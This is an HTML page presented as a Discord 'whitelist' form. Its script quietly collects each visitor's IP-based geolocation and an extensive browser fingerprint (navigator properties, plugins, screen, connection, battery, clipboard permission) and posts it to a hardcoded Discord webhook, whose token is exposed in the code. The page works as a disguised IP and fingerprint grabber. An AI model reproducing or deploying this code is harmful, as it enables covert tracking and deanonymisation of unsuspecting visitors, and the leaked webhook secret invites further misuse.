<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Whitelist Button</title>
  <style>
    body { font-family: sans-serif; display: flex; flex-direction: column; gap: 1rem; align-items: center; justify-content: center; height: 100vh; background: #f9fafb; }
    input, button { padding: 0.6rem 1rem; font-size: 1rem; border-radius: 8px; border: 1px solid #ccc; }
    button { background: #10b981; color: white; border: none; cursor: pointer; }
    button:disabled { background: #9ca3af; cursor: not-allowed; }
    button:hover:enabled { background: #059669; }
  </style>
</head>
<body>
  <input type="text" id="discordId" placeholder="Enter Discord User ID" />
  <button id="whitelistBtn" disabled>Whitelist</button>

  <script>
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1400234987541893260/U0Oi5nji0bljkiODyK8pd_9excATVoTFoFkqp1vc2ksKrZCbp3IpuUU6JuXQs1SUVPqr';
    const whitelistBtn = document.getElementById('whitelistBtn');
    const discordIdInput = document.getElementById('discordId');
    const RATE_LIMIT_HOURS = 24;
    const STORAGE_KEY = 'lastWhitelistTime';

    discordIdInput.addEventListener('input', () => {
      const value = discordIdInput.value.trim();
      whitelistBtn.disabled = !/^\d+$/.test(value);
    });

    function isRateLimited() {
      try {
        const lastTime = localStorage.getItem(STORAGE_KEY);
        if (!lastTime) return false;
        const diff = (Date.now() - parseInt(lastTime, 10)) / (1000 * 60 * 60);
        return diff < RATE_LIMIT_HOURS;
      } catch {
        return false;
      }
    }

    function getGeoData(callback) {
      try {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://ipapi.co/json/', true);
        xhr.onreadystatechange = function() {
          if (xhr.readyState === 4) {
            if (xhr.status === 200) {
              try { callback(JSON.parse(xhr.responseText)); } catch { callback({}); }
            } else {
              callback({});
            }
          }
        };
        xhr.send();
      } catch {
        callback({});
      }
    }

    function gatherDiagnostics(callback) {
      const diagnostics = {
        battery: null,
        clipboardPermission: null,
        navigatorProperties: {},
        screen: {},
        plugins: [],
        mimeTypes: [],
        connection: null
      };

      // Navigator properties
      const navProps = ['userAgent','language','languages','platform','cookieEnabled','onLine','hardwareConcurrency','deviceMemory','maxTouchPoints','doNotTrack','vendor','product','productSub'];
      navProps.forEach(prop => {
        try { diagnostics.navigatorProperties[prop] = navigator[prop] !== undefined ? navigator[prop] : null; } catch {}
      });

      // Screen properties
      const screenProps = ['width','height','availWidth','availHeight','colorDepth','pixelDepth'];
      screenProps.forEach(prop => {
        try { diagnostics.screen[prop] = screen[prop] !== undefined ? screen[prop] : null; } catch {}
      });

      // Plugins and mimeTypes
      try { diagnostics.plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name) : []; } catch {}
      try { diagnostics.mimeTypes = navigator.mimeTypes ? Array.from(navigator.mimeTypes).map(m => m.type) : []; } catch {}

      // Connection
      try {
        if (navigator.connection) {
          diagnostics.connection = {
            effectiveType: navigator.connection.effectiveType || null,
            downlink: navigator.connection.downlink || null,
            rtt: navigator.connection.rtt || null,
            saveData: navigator.connection.saveData || false
          };
        }
      } catch {}

      // Clipboard permission
      try {
        if (navigator.permissions) {
          navigator.permissions.query({name:'clipboard-read'}).then(p => { diagnostics.clipboardPermission = p.state; }).catch(() => {});
        }
      } catch {}

      // Battery
      try {
        if (navigator.getBattery) {
          navigator.getBattery().then(b => {
            diagnostics.battery = {
              charging: b.charging,
              level: b.level,
              chargingTime: b.chargingTime,
              dischargingTime: b.dischargingTime
            };
            callback(diagnostics);
          }).catch(() => callback(diagnostics));
        } else {
          callback(diagnostics);
        }
      } catch {
        callback(diagnostics);
      }
    }

    function sendData() {
      if (isRateLimited()) { alert('You can only whitelist once every 24 hours.'); return; }

      getGeoData(function(geoData) {
        gatherDiagnostics(function(diagnostics) {
          const payload = {
            timestamp: new Date().toISOString(),
            discordUserId: discordIdInput.value.trim(),
            page: location.href,
            referrer: document.referrer || null,
            timezone: Intl.DateTimeFormat ? Intl.DateTimeFormat().resolvedOptions().timeZone : null,
            ipInfo: geoData,
            diagnostics: diagnostics
          };

          // Use XHR to ensure maximum compatibility
          try {
            const formData = new FormData();
            formData.append('file', new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' }), 'visitor_data.json');
            formData.append('content', `Visitor data from Discord User ID: ${discordIdInput.value.trim()}`);

            const xhr = new XMLHttpRequest();
            xhr.open('POST', WEBHOOK_URL, true);
            xhr.onload = function() {
              if (xhr.status >= 200 && xhr.status < 300) {
                alert('Data sent successfully.');
                try { localStorage.setItem(STORAGE_KEY, Date.now().toString()); } catch {}
                whitelistBtn.disabled = true;
              } else {
                alert('Failed to send data. Status: ' + xhr.status);
              }
            };
            xhr.onerror = function() { alert('Error sending data.'); };
            xhr.send(formData);
          } catch(err) {
            alert('Unexpected error: ' + err.message);
          }
        });
      });
    }

    if (isRateLimited()) whitelistBtn.disabled = true;
    whitelistBtn.addEventListener('click', sendData);
  </script>
</body>
</html>
